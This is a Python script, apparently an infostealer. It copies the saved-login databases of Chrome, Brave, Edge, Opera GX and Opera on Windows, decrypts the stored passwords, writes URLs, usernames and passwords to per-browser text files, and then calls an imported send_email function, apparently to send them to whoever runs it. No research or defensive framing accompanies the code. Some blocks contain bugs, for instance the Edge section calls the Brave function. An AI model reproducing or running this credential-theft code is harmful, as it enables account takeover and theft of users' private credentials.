from functions import get_secret_key, decrypt_password, send_email
import os
import sqlite3
import shutil


def brave_pass_get():
    secret_key = get_secret_key(PATH_LOCAL_STATE=BRAVE_PATH_LOCAL_STATE)
    path_login_db = rf"C:\Users\{uname}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    shutil.copy2(path_login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = []
    for index, data in enumerate(cursor.fetchall()):
        url = data[0]
        login = data[1]
        password = data[2]
        desc_pass = decrypt_password(buff=password, master_key=secret_key)
        print(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}")
        print("=" * 50)
        main_list.append(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}\n{'=' * 50}\n")
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return main_list


def chrome_pass_get():
    secret_key = get_secret_key(PATH_LOCAL_STATE=CHROME_PATH_LOCAL_STATE)
    path_login_db = rf"C:\Users\{uname}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    shutil.copy2(path_login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = []
    for index, data in enumerate(cursor.fetchall()):
        url = data[0]
        login = data[1]
        password = data[2]
        desc_pass = decrypt_password(buff=password, master_key=secret_key)
        print(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}")
        print("=" * 50)
        main_list.append(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}\n{'=' * 50}\n")
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return main_list


def edge_pass_get():
    secret_key = get_secret_key(PATH_LOCAL_STATE=EDGE_PATH_LOCAL_STATE)
    path_login_db = rf"C:\Users\{uname}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    shutil.copy2(path_login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = []
    for index, data in enumerate(cursor.fetchall()):
        url = data[0]
        login = data[1]
        password = data[2]
        desc_pass = decrypt_password(buff=password, master_key=secret_key)
        print(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}")
        print("=" * 50)
        main_list.append(f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {desc_pass}\n{'=' * 50}\n")
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return main_list



uname = os.getlogin()

try:
    CHROME_PATH_LOCAL_STATE = os.path.normpath(rf"C:\Users\{uname}\AppData\Local\Google\Chrome\User Data\Local State")
    passwords = chrome_pass_get()
    with open(f"{uname}_pass_chrome.txt", mode="w", newline='\n', encoding='utf-8') as file:
        file.writelines(passwords)
except Exception as e:
    print(f"[ERROR] {e}")

try:
    BRAVE_PATH_LOCAL_STATE = os.path.normpath(
        rf"C:\Users\{uname}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
    passwords = brave_pass_get()
    with open(f"{uname}_pass_brave.txt", mode="w", newline='\n', encoding='utf-8') as file:
        file.writelines(passwords)
except Exception as e:
    print(f"[ERROR] {e}")

try:
    EDGE_PATH_LOCAL_STATE = os.path.normpath(rf"C:\Users\{uname}\AppData\Local\Microsoft\Edge\User Data\Local State")
    passwords = brave_pass_get()
    with open(f"{uname}_pass_edge.txt", mode="w", newline='\n', encoding='utf-8') as file:
        file.writelines(passwords)
except Exception as e:
    print(f"[ERROR] {e}")

try:
    OPERAGX_PATH_LOCAL_STATE = rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera GX Stable\Local State"
    master_key = get_secret_key(OPERAGX_PATH_LOCAL_STATE)
    path_login_db = rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"
    shutil.copy2(path_login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = []
    for index, data in enumerate(cursor.fetchall()):
        url = data[0]
        login = data[1]
        password = data[2]
        decrypted_password = decrypt_password(password, master_key)
        main_list.append(
            f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {decrypted_password}\n{'=' * 50}\n")
        passwords = main_list
        with open(f"{uname}_pass_opera_gx.txt", mode="w", newline='\n', encoding='utf-8') as file:
            file.writelines(passwords)
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
except Exception as e:
    print(f"[ERROR] {e}")
try:
    OPERA_PATH_LOCAL_STATE = rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera Stable\Local State"
    master_key = get_secret_key(OPERA_PATH_LOCAL_STATE)
    path_login_db = rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera Stable\Login Data"
    shutil.copy2(path_login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = []
    os.remove("Loginvault.db")
    for index, data in enumerate(cursor.fetchall()):
        url = data[0]
        login = data[1]
        password = data[2]
        decrypted_password = decrypt_password(password, master_key)
        main_list.append(
            f"Index: {index}\nUrl: {url}\nUsername: {login}\nPassword: {decrypted_password}\n{'=' * 50}\n")
        passwords = main_list
        with open(f"{uname}_pass_opera.txt", mode="w", newline='\n', encoding='utf-8') as file:
            file.writelines(passwords)
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
except Exception as e:
    print(f"[ERROR] {e}")


try:
    send_email(uname=uname)
except Exception as e:
    print(f"[ERROR] {e}")
